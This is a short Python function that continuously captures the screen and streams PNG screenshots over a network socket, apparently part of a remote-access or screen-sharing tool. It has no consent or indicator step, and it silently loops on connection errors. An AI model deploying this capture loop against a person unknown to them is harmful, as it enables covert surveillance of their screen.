import pyautogui
import io
import struct
from PIL import ImageGrab
import json

def send_screenshot(client_socket):
    while True:
        try:
            try:
                screenshot = pyautogui.screenshot()
            except OSError:
                screenshot = ImageGrab.grab()

            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            screenshot_data = buffer.getvalue()

            client_socket.sendall(struct.pack(">I", len(screenshot_data)))

            total_sent = 0
            while total_sent < len(screenshot_data):
                sent = client_socket.send(screenshot_data[total_sent:])
                total_sent += sent
        except (ConnectionError, ConnectionResetError):
            pass
        except Exception as e:
            message = f"From Remote: {str(e)}"
            client_socket.sendall(json.dumps({"logger": message}).encode())
